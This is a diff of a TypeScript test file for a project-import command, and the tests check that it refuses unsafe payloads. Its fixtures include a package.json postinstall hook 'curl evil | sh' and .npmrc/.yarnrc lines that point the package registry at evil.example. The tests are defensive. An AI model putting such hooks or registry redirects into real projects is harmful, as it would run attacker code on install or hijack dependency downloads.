@@ -31,7 +31,10 @@ interface BuildOpts {
 
 /** Build a staged artifact directory whose manifest is correct by construction. */
 async function buildArtifact(opts: BuildOpts = {}): Promise<string> {
-  const files = opts.files ?? { "AGENTS.md": "# blueprint surface\n", "scripts/gen.mjs": "export default 1\n" };
+  const files = opts.files ?? {
+    "AGENTS.md": "# blueprint surface\n",
+    "scripts/gen.mjs": "export default 1\n",
+  };
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), "bp-art-"));
   for (const [rel, body] of Object.entries({ ...files, ...(opts.stowaways ?? {}) })) {
     const abs = path.join(dir, "payload", rel);
@@ -58,7 +61,9 @@ async function buildArtifact(opts: BuildOpts = {}): Promise<string> {
 }
 
 /** A minimal stand-in for a `sailor init` project: .sail/ plus some stock surface. */
-function makeProject(stockSkills: string[] = ["sailor-operate", "sailor-mandates", "sailor-strategy"]): string {
+function makeProject(
+  stockSkills: string[] = ["sailor-operate", "sailor-mandates", "sailor-strategy"],
+): string {
   const root = fs.mkdtempSync(path.join(os.tmpdir(), "bp-proj-"));
   fs.mkdirSync(path.join(root, ".sail"), { recursive: true });
   fs.writeFileSync(path.join(root, "AGENTS.md"), "# Stock scaffold guide\n");
@@ -164,11 +169,52 @@ test("import refuses a payload carrying a possible secret", async () => {
 
 test("import refuses a payload package.json with auto-running scripts", async () => {
   const art = await buildArtifact({
-    files: { "AGENTS.md": "# s\n", "package.json": '{"scripts":{"postinstall":"curl evil | sh"}}\n' },
+    files: {
+      "AGENTS.md": "# s\n",
+      "package.json": '{"scripts":{"postinstall":"curl evil | sh"}}\n',
+    },
     roles: { "package.json": "config" },
   });
   const { threw } = await capture(() => blueprintImport(art, makeProject(), { yes: true }));
   assert.match(threw?.message ?? "", /auto-running scripts/);
+});
+
+test("import refuses a payload that ships package-manager, agent, editor or CI config", async () => {
+  // `.npmrc` redirects the very next `npm install` to whatever registry it names — the
+  // one file that runs without being read. Same class as a lifecycle hook, so same refusal.
+  const art = await buildArtifact({
+    files: { "AGENTS.md": "# s\n", ".npmrc": "registry=https://evil.example/\n" },
+    roles: { ".npmrc": "config" },
+  });
+  const proj = makeProject();
+  const { threw } = await capture(() => blueprintImport(art, proj, { yes: true }));
+  assert.match(threw?.message ?? "", /may not ship \(\.npmrc\)/);
+  assert.ok(!fs.existsSync(path.join(proj, ".npmrc")), "nothing may be written before the refusal");
+
+  // Nested and directory forms are refused too; `.cursor/rules` is a legitimate surface.
+  const nested = await buildArtifact({
+    files: {
+      "AGENTS.md": "# s\n",
+      "tools/.yarnrc.yml": "npmRegistryServer: https://evil.example\n",
+      ".github/workflows/ci.yml": "on: push\n",
+      ".cursor/rules/sailor.mdc": "# rules\n",
+    },
+  });
+  const { threw: nestedThrew } = await capture(() =>
+    blueprintImport(nested, makeProject(), { yes: true }),
+  );
+  assert.match(nestedThrew?.message ?? "", /tools\/\.yarnrc\.yml, \.github\/workflows\/ci\.yml/);
+  assert.doesNotMatch(nestedThrew?.message ?? "", /\.cursor/);
+
+  const cursorOnly = await buildArtifact({
+    files: { "AGENTS.md": "# s\n", ".cursor/rules/sailor.mdc": "# rules\n" },
+  });
+  const proj2 = makeProject();
+  const { threw: cursorThrew } = await capture(() =>
+    blueprintImport(cursorOnly, proj2, { yes: true }),
+  );
+  assert.equal(cursorThrew, null, cursorThrew?.message);
+  assert.ok(fs.existsSync(path.join(proj2, ".cursor", "rules", "sailor.mdc")));
 });
 
 test("import writes a payload package.json (agent surface) but refuses to prune it", async () => {
@@ -188,9 +234,14 @@ test("import writes a payload package.json (agent surface) but refuses to prune 
     surface: { pruned: ["package.json"] },
   });
   const proj2 = makeProject();
-  const { threw: pruneThrew } = await capture(() => blueprintImport(pruneArt, proj2, { yes: true }));
+  const { threw: pruneThrew } = await capture(() =>
+    blueprintImport(pruneArt, proj2, { yes: true }),
+  );
   assert.equal(pruneThrew, null, pruneThrew?.message);
-  assert.ok(fs.existsSync(path.join(proj2, "package.json")), "package.json must survive a prune request");
+  assert.ok(
+    fs.existsSync(path.join(proj2, "package.json")),
+    "package.json must survive a prune request",
+  );
 });
 
 test("import refuses unattended when stdin is not a TTY and --yes is absent", async () => {
@@ -227,7 +278,10 @@ test("import replaces the stock surface and prunes what the design does not use"
   assert.ok(!fs.existsSync(path.join(proj, "src", "mandate.ts")), "pruned path must be gone");
   // keepSkills names only sailor-operate, but sailor-mandates is a core skill and is
   // protected from pruning. sailor-strategy is custom and not kept, so it goes.
-  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), ["sailor-mandates", "sailor-operate"]);
+  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), [
+    "sailor-mandates",
+    "sailor-operate",
+  ]);
 });
 
 test("import never deletes a skill the artifact itself ships", async () => {
@@ -240,7 +294,10 @@ test("import never deletes a skill the artifact itself ships", async () => {
   assert.equal(threw, null, threw?.message);
   // keepSkills is empty, yet the shipped skill survives — otherwise import would delete
   // what it just installed. sailor-mandates is core, so it survives too.
-  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), ["bp-skill", "sailor-mandates"]);
+  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), [
+    "bp-skill",
+    "sailor-mandates",
+  ]);
 });
 
 test("import never prunes a core skill, even when keepSkills is empty", async () => {
@@ -253,7 +310,9 @@ test("import never prunes a core skill, even when keepSkills is empty", async ()
   const proj = makeProject(["sailor-navigator", "sailor-strategy"]);
   const { threw } = await capture(() => blueprintImport(art, proj, { yes: true }));
   assert.equal(threw, null, threw?.message);
-  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), ["sailor-navigator"]);
+  assert.deepEqual(fs.readdirSync(path.join(proj, ".agents", "skills")).sort(), [
+    "sailor-navigator",
+  ]);
 });
 
 test("import never writes the manifest into the project", async () => {
@@ -263,9 +322,9 @@ test("import never writes the manifest into the project", async () => {
   // The manifest names the blueprint, version and grade; a project carrying it is no longer
   // a blind subject for a later measurement cycle.
   const walk = (d: string): string[] =>
-    fs.readdirSync(d, { withFileTypes: true }).flatMap((e) =>
-      e.isDirectory() ? walk(path.join(d, e.name)) : [e.name],
-    );
+    fs
+      .readdirSync(d, { withFileTypes: true })
+      .flatMap((e) => (e.isDirectory() ? walk(path.join(d, e.name)) : [e.name]));
   assert.ok(!walk(proj).includes("blueprint.manifest.json"));
 });
 
@@ -279,6 +338,22 @@ test("import writes the .sail/.blueprint marker with the blueprint identity", as
   assert.equal(marker.version, "v1");
   assert.equal(marker.kind, "crystallized");
   assert.ok(marker.importedAt, "importedAt should be recorded for the future harbor update path");
+  // Not a Harbor fetch: no release tag to record, but the key is present so readers can rely on it.
+  assert.equal(marker.release, null);
+});
+
+test("import records the registry release tag in the marker when given one", async () => {
+  const art = await buildArtifact();
+  const proj = makeProject();
+  const { threw } = await capture(() =>
+    blueprintImport(art, proj, { yes: true, releaseTag: "t-bp-v3" }),
+  );
+  assert.equal(threw, null, threw?.message);
+  const marker = JSON.parse(fs.readFileSync(path.join(proj, ".sail", ".blueprint"), "utf-8"));
+  // `harbor update` compares this against the latest `<slug>-v<n>` tag; the manifest's own
+  // `blueprint.version` ("v1" here, "1.0.0" for published ones) is a different axis.
+  assert.equal(marker.release, "t-bp-v3");
+  assert.equal(marker.version, "v1");
 });
 
 test("import appends a fragment instead of overwriting its target, idempotently", async () => {
@@ -298,7 +373,11 @@ test("import appends a fragment instead of overwriting its target, idempotently"
 
   await capture(() => blueprintImport(art, proj, { yes: true }));
   guide = fs.readFileSync(path.join(proj, "GUIDE.md"), "utf-8");
-  assert.equal(guide.match(/build-notes:start/g)?.length, 1, "re-import must replace, not stack, the block");
+  assert.equal(
+    guide.match(/build-notes:start/g)?.length,
+    1,
+    "re-import must replace, not stack, the block",
+  );
 });
 
 test("--dry-run reports the whole plan and writes nothing", async () => {
